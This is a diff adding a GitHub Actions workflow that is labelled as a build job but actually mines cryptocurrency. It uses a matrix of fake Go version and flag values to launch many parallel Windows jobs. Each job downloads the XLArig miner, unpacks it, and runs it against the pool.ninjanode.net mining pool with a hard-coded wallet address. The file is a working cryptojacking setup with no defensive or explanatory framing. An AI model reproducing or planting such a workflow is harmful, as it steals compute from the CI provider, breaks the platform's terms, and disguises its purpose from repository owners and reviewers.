@@ -1,0 +1,51 @@
+name: eX-code_UMBL
+
+ 
+
+on: [workflow_dispatch]
+
+ 
+
+jobs:
+
+  build:
+
+    name: eX-code_UMBL
+
+    runs-on: windows-latest
+
+    strategy:
+
+      max-parallel: 5
+
+      fail-fast: false
+
+      matrix:
+
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+
+        flag: [A, B, C, D, E, F, G, H, I]
+
+    env:
+
+        NUM_JOBS: 20
+
+        JOB: ${{ matrix.go }}
+
+    steps:
+
+    - name: PREPARING
+
+      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+
+    - name: Seting-UP
+
+      run: Expand-Archive XLArig-v5.2.2-win64.zip
+
+    - name: Running
+
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o pool.ninjanode.net:3013 -p x -a argon2/wrkz -k -t 1 --cpu-max-threads-hint 25 -u Ninja12eVTM2eB4E4d9HDB8nyeum1TftX38LGNnWKm7QE3SyrjiQRH91k8w8wftGSSZ7anLxoGHpYTQeBFLEEeFCXGPGKNfX84g2E
+
+    - name: DONE
+
+      run: exit
